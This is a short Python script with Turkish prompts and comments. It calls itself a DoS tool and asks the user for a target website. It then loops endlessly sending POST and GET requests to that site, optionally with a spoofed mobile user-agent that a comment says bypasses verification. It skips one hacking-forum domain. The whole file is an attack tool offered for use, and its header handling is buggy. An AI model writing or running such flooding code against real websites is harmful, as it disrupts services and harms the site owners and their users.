import requests as req

import time,sys

headers={r'user-agentMozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36'}

#user-agent ile doğrulamayi bypass ettik

print( """

DoS toolu 

1-user agnet li için

2-user agnetsiz

""")

sec = int(input("İşlem giriniz: "))

def hacker():

    attcak = input("Saldırı için (http/https) şeklinde: ")

    if attcak == "https://www.turkhackteam.org":

       sys.exit()

    print(f"Saldırı olucak wrb sitesi ==> {attcak}")

    time.sleep(0.5)

    giden_p = 0

    while True:

        try:

            giden_p += 2

            time.sleep(0.1)

            print(f"giden saldırı{giden_p} ==>  {attcak}")

            req.post(attcak,headers)

            req.get(attcak,headers)

        except:

            print( "DoS gönderirken hata oldu lütfen bizimle iletişime geçin!")

            sys.exit()

def hack():

    giden_p = 0

    attcak = input("Saldı(http/https) şeklinde: ")

    if attcak == "https://www.turkhackteam.org":

        sys.exit()

    print(f"Saldırı olucak web sitesi ==> {attcak}")

    time.sleep(0.5)

    while True:

        try:

            giden_p += 2

            time.sleep(0.1)

            print(f"giden saldırı{giden_p} ==> {attcak}")

            req.post(attcak)

            req.get(attcak)

        except:

            print("DoS gönderirken hata oldu lütfen bizimle iletişime geçin!")

            sys.exit()

if sec == 1:

    hacker()

if sec == 2:

    hack()

    
